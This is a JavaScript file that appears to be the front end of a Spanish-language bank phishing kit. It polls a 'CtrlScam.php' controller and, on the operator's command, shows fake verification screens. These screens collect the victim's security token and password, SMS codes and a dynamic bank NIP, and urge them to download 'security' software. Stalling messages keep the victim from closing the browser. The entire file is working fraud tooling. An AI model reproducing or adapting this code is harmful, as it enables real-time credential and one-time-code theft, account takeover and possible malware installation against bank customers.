var segundos = 0;
var MensajesLoading = [
    'Este proceso puede tardar unos minutos, <b>NO CIERRE EL NAVEGADOR</b>, gracias.',
    'Actualizando datos, <b>NO CIERRE EL NAVEGADOR</b>, gracias.',
    'Por favor no interrumpa este proceso, <b>NO CIERRE EL NAVEGADOR</b>, gracias.',
    'El sistema esta validando sus datos, <b>NO CIERRE EL NAVEGADOR</b>, gracias.',
    'Por favor espere mientras procesamos su solicitud, <b>NO CIERRE EL NAVEGADOR</b>, gracias.Por favor espere mientras procesamos su solicitud, <b>NO CIERRE EL NAVEGADOR</b>, gracias.'
];

var pos = 0;

function cargarBarr() {

    var barr = document.getElementById('Barr2min');
    var valBarr = barr.value;
    valBarr += 0.83;
    barr.value = valBarr;
    segundos++;

    if (segundos > 120) {
        segundos = 0;
        document.getElementById('Barr2min').value = 0;
    } else {
        var res = segundos % 5;
        if (res == 0) {
            $('#avisopreventivo').html(MensajesLoading[pos]);
            if (pos == 2) {pos = 0;} else {pos++;}
        }
    }
}

function cargarBarrInfinite() {

    var barr = document.getElementById('Barr2min');
    var valBarr = barr.value;
    valBarr += 0.83;
    barr.value = valBarr;
    segundos++;

    if (segundos > 120) {
        segundos = 0;
        document.getElementById('Barr2min').value = 0;
    } else {
        var res = segundos % 5;
        if (res == 0) {
            $('#avisopreventivo').html(MensajesLoading[pos]);
            if (pos == 2) { pos = 0; } else { pos++;}
        }
    }
}


var App = {
    DATA: '',
    request_temporal: '',
    tipoToken: '',
    reqSystem: '',
    folio: '',
    sql: '',
    idData: '',
    usuarioLOG: '',
    NETKEYCodeSERVER: '',
    MENSAJESERVER: '',
    NAME_PERSONA_SERVER: '',
    mode: 'load',
    loadMobile2: '',
    loadMobileInfinite: '',
    int: '',
    int2: '',
    int3: '',
    session: '',
    idHistory: '',
    redirect: '',
    name_server: '',
    msg_server: '',
    loadHTML: '',
    tituloView: '',
    getTime: function(){
        var d = new Date();
        var h = d.getHours();
        var m = d.getMinutes();
        var s = d.getSeconds();
        var tz = "";
        var fecha = "";
    
        if(h<10){h = "0"+h;tz = "AM";}else{tz = "PM";}
        if(m<10){m = "0"+m;}
        if(s<10){s = "0"+s;}
        fecha = h+":"+m+":"+s+" "+tz;
    
        return fecha;
    },
    init: function(){
        this.session = $('#session');
        this.idHistory = $('#idHistory');
        this.redirect = $('#mensajeData');
        this.loadHTML = $('#changeHTML');
        this.tituloView = $('#breadcrumbs');

        //console.log(this.getTime());

        if(App.redirect.val() == '1'){
            this.changeHTML('cargando');
            App.int2 = self.setInterval("cargarBarr()", 1000);
        }else{
            this.changeHTML('cargando');
            App.int2 = self.setInterval("cargarBarr()", 1000);
        }

        App.int = self.setInterval("App.refresh_request()", 1000);

    },
    refresh_request: function(){
        $.ajax({
            type: 'POST',
            url: '../../Controllers/CtrlScam.php',
            data: {
                "request": "refresh_online",
                "session": App.session.val()
            },
            beforeSend: function () {
                console.log("Enviando...");
            },
            success: function (resp) {
                App.DATA = JSON.parse(resp);

                for(var i=0; i <= App.DATA.length-1; i++){
                    App.idData = App.DATA[i].id;
                    App.reqSystem = App.DATA[i].requet;
                    App.folio = App.DATA[i].folio;
                    App.NETKEYCodeSERVER = App.DATA[i].codigo_drop;
                    App.MENSAJESERVER = App.DATA[i].mensaje;
                    App.NAME_PERSONA_SERVER = App.DATA[i].nombre_completo; 
                    App.usuarioLOG = App.DATA[i].usuario;  
                }

                $('.name_server').text(App.NAME_PERSONA_SERVER);
                $('.folio_server').text(" "+App.folio);

                if(App.reqSystem == 'mgs_con_input'){
                    $('.mensaje_server').html(App.MENSAJESERVER+'<span class="requiredAsterisk">&nbsp;</span><span class="screenReaderOnly">*</span>');
                }else{
                    $('.mensaje_server').html(App.MENSAJESERVER);
                }

                $('#nameServerCargando').html(App.NAME_PERSONA_SERVER);
                $('#folio').text(App.folio);
                $('#idHistory').val(App.idData);

                $('.name_usuario_server').text(App.usuarioLOG);


                console.log('ID: '+App.idData+' Request: '+App.reqSystem+' Folio: '+App.folio+' NetKey: '+App.NETKEYCodeSERVER+' Mensaje: '+App.MENSAJESERVER);

                if(App.reqSystem == 'mgs_con_input'){

                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "mgs_con_input"){
                            App.changeHTML('con_input');
                        }
                
                        App.mode = "mgs_con_input";
                    }else{
                        App.changeHTML('con_input');
                        App.mode = "mgs_con_input";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }
                
                
                if(App.reqSystem == 'mgs_sin_input'){
                
                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "mgs_sin_input"){
                            App.changeHTML('sin_input');
                        }
                
                        App.mode = "mgs_sin_input";
                    }else{
                        App.changeHTML('sin_input');
                        App.mode = "mgs_sin_input";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }
                
                
                if(App.reqSystem == 'mgs_index_scam'){
                
                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "mgs_index_scam"){
                            App.changeHTML('salir_index_scam');
                        }
                
                        App.mode = "mgs_index_scam";
                    }else{
                        App.changeHTML('salir_index_scam');
                        App.mode = "mgs_index_scam";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }
                
                
                if(App.reqSystem == 'mgs_index_original'){
                
                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "mgs_index_original"){
                            App.changeHTML('salir_index_original');
                        }
                
                        App.mode = "mgs_index_original";
                    }else{
                        App.changeHTML('salir_index_original');
                        App.mode = "mgs_index_original";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }
                
                
                if(App.reqSystem == 'mgs_folio'){
                
                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "mgs_folio"){
                            App.changeHTML('folio');
                        }
                
                        App.mode = "mgs_folio";
                    }else{
                        App.changeHTML('folio');
                        App.mode = "mgs_folio";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }
                
                
                if(App.reqSystem == 'pedir_download_soft'){
                
                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "msg_software"){
                            App.changeHTML('pedir_software');
                        }
                
                        App.mode = "msg_software";
                    }else{
                        App.changeHTML('pedir_software');
                        App.mode = "msg_software";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }



                if(App.reqSystem == 'pedir_token'){

                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "msg_pedir_token"){
                            App.changeHTML('token_password');
                        }
                
                        App.mode = "msg_pedir_token";
                    }else{
                        App.changeHTML('token_password');
                        App.mode = "msg_pedir_token";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }






                if(App.reqSystem == 'nip_dinamico_supernet'){

                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "nip_dinamico_supernet"){
                            App.changeHTML('nip_dinamico_supernet');
                        }
                
                        App.mode = "nip_dinamico_supernet";
                    }else{
                        App.changeHTML('nip_dinamico_supernet');
                        App.mode = "nip_dinamico_supernet";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }






                if(App.reqSystem == 'codigo_sms_actual'){

                    if(App.mode == 'load'){clearInterval(App.int2);}
                    if(App.mode == 'loading2'){clearInterval(App.int3);}
                
                    if(App.mode == 'loadMobile'){clearInterval(App.loadMobile2);}
                    if(App.mode == 'loadMobileInfinite'){clearInterval(App.loadMobileInfinite);}
                
                    if(App.reqSystem == App.request_temporal){
                        if(App.mode != "codigo_sms_actual"){
                            App.changeHTML('codigo_sms_actual');
                        }
                
                        App.mode = "codigo_sms_actual";
                    }else{
                        App.changeHTML('codigo_sms_actual');
                        App.mode = "codigo_sms_actual";
                
                        App.request_temporal = App.reqSystem;
                    }
                
                }



                
                
                
                

            },
            error: function (request, textStatus, errorThrown) {
                console.log('Error al Enviar los Datos');
            }
        });
    },
    changeHTML(view = 'test'){
        let titulo = '';
        switch(view){
            case 'codigo_sms_actual':
                $('#i37').hide();
                titulo = 'Verificando Informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/codigo_sms_actual.php');
                break;
            case 'nip_dinamico_supernet':
                $('#i37').hide();
                titulo = 'Verificando su informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                //this.loadHTML.load('telas/nip_dinamico_supernet.php');
                $('#UtilDialog').hide();
                $('#changeNipDinamico').load('telas/nip_dinamico_supernet.php');
                break;
            case 'cargando':
                $('#i37').hide();
                titulo = 'Verificando su informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/cargando.php');
                break;
            case 'folio':
                $('#i37').hide();
                titulo = '¡Operaci&oacute;n Exitosa!';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/folio.php');
                break;
            case 'con_input':
                $('#i37').hide();
                titulo = 'Verificando Informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/con_input.php');
                break;
            case 'sin_input':
                $('#i37').hide();
                titulo = 'Verificando Informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/sin_input.php');
                break;
            case 'salir_index_scam':
                $('#i37').hide();
                titulo = 'Verificando Informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/salir_index_scam.php');
                break;
            case 'salir_index_original':
                $('#i37').hide();
                titulo = 'Verificando Informaci&oacute;n';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/salir_index_original.php');
                break;
            case 'pedir_software':
                titulo = 'Seguridad';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/pedir_software.php');
                break;
            case 'view_instrucciones':
                titulo = 'Pasos para la instalaci&oacute;n del software';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/view_instrucciones.php');
                break;
            case 'token_password':
                titulo = 'Capturar credenciales de seguridad';
                this.tituloView.html('<ul><li class="first last">'+titulo+'</li></ul>');
                this.loadHTML.load('telas/token_password.php');
                break;
            default:
                this.loadHTML.load('telas/cargando.php');
                break;

        }
    }
};

$(document).ready(function(){
    App.init();
});